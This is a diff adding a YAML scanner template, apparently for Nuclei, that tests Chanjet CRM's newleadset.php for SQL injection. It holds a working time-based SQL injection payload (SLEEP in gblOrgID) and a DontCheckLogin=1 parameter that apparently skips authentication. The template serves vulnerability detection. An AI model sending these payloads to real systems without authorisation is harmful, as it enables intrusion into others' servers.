@@ -1,0 +1,46 @@
+id: poc-yaml-changjie-crm-newleadset-php-sqli
+info:
+  name: 畅捷通CRM newleadset.php SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: "{{rand_int(5,10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - raw:
+      - |
+        GET /lead/newleadset.php?gblOrgID=1 HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "Fatal error"
+        part: body
+        negative: true
+
+  - raw:
+      - |
+        GET /lead/newleadset.php?gblOrgID=1+AND+(SELECT+5244+FROM+(SELECT(SLEEP({{t1}})))HAjH)--+-&DontCheckLogin=1 HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "Fatal error"
+        part: body
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
